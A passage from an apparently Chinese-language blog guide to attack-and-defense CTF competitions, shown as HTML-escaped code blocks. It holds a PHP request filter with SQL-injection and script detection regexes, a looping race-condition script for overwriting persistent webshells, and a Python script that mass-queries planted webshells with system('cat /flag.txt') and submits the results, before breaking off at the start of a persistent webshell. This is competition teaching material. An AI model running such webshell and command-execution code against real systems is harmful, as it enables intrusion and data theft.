&lt;span class=&#34;token variable&#34;&gt;$postfilter&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\\b(and|or)\\b.&amp;#123;1,6&amp;#125;?(=|&gt;|&amp;lt;|\\bin\b|\\blike\\b)|\\/\\*.+?\\*\\/|&amp;lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$cookiefilter&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\\b(and|or)\\b.&amp;#123;1.6&amp;#125;?(=|&gt;|&amp;lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&amp;lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;DefendAttack&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$StrFiltKey&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$StrFiltValue&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$ArrFiltReq&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
	&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;is_array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$StrFiltValue&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
		&lt;span class=&#34;token variable&#34;&gt;$StrFiltValue&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;implode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$StrFiltValue&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
	&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;/&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$ArrFiltReq&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;/is&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$StrFiltValue&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
		&lt;span class=&#34;token comment&#34;&gt;//slog (&#34;&amp;lt;br&gt;&amp;lt;br &gt; 操作 IP:&#34;.$_SERVER [&#34;REMOTE_ADDR&#34;].&#34;&amp;lt;br &gt; 操作时间:&#34;.strftime (&#34;% Y-% m-% d % H:% M:% S&#34;).&#34;&amp;lt;br &gt; 操作页面:&#34;.$_SERVER [&#34;PHP_SELF&#34;].&#34;&amp;lt;br &gt; 提交方式:&#34;.$_SERVER [&#34;REQUEST_METHOD&#34;].&#34;&amp;lt;br &gt; 提交参数:&#34;.$StrFiltKey.&#34;&amp;lt;br &gt; 提交参数:&#34;.$StrFiltValue);&lt;/span&gt;
		&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;360WebSec notice: Illegal operation!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
		&lt;span class=&#34;token keyword&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//$ArrPGC = array_merge($_GET, $_POST, $_COOKIE);&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
	&lt;span class=&#34;token function&#34;&gt;DefendAttack&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$getfilter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
	&lt;span class=&#34;token function&#34;&gt;DefendAttack&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$postfilter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_COOKIE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
	&lt;span class=&#34;token function&#34;&gt;DefendAttack&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$cookiefilter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;file_exists&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;filename&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
	&lt;span class=&#34;token comment&#34;&gt;# code...&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;slog&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$logs&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
	&lt;span class=&#34;token variable&#34;&gt;$toppath&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;DOCUMENT_ROOT&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;/log.htm&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;token variable&#34;&gt;$Ts&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$toppath&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;a+&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;token function&#34;&gt;fputs&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$Ts&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$logs&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\r\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;token function&#34;&gt;fclose&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$Ts&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;

&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;对于别人上传过来的不死马进行处理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;杀死进程，可以使用 ps aux 命令 列出所有进程，找到要杀掉的进程运用命令，kill pid 就可以了&lt;/li&gt;
&lt;li&gt;通过条件竞争写入无效内容或者删除不死马文件，代码如下（竞争写入无关内容，config 是木马名）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&#34;token function&#34;&gt;ignore_user_abort&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token function&#34;&gt;set_time_limit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token function&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;.config.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$code&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;???&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;//pass=pass&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&#34;token function&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$code&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token function&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;touch -m -d &#34;2018-12-01 09:10:12&#34; .config.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token function&#34;&gt;usleep&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;当然最好的防御还是攻击&lt;/p&gt;
&lt;h2 id=&#34;利用漏洞攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用漏洞攻击&#34;&gt;#&lt;/a&gt; 利用漏洞攻击&lt;/h2&gt;
&lt;p&gt;d 盾扫出来的 shell 只要手快还是可以先打一波的，可以在赛前提前写好简单的 shell 利用批量化脚本&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; fontTools&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;afmLib
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; json
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; re

&lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;url.txt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;r&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; url1&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    data&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;url1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;readlines&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

paylaod2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;flag&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
header2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&#34;token string&#34;&gt;&#34;token&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;token string&#34;&gt;&#34;Cookie&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#平台 url&lt;/span&gt;
url2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        urlpro&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;http://&amp;#123;&amp;#125;/.a.php?c=system(&#39;cat /flag.txt&#39;);&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        res&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;urlpro&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;#print(urlpro)&lt;/span&gt;
        p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;re&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;compile&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;flag.*&amp;#125;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        a&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;join&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;findall&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        paylaod2&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;flag&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a
        &lt;span class=&#34;token comment&#34;&gt;# print(paylaod2)&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;# post 请求&lt;/span&gt;
        res2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; paylaod2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; headers&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;header2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;当然这样可能只能拿到一轮的分数，所以我们可以上传不死马，下面是一个常用的 MD5 不死马&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
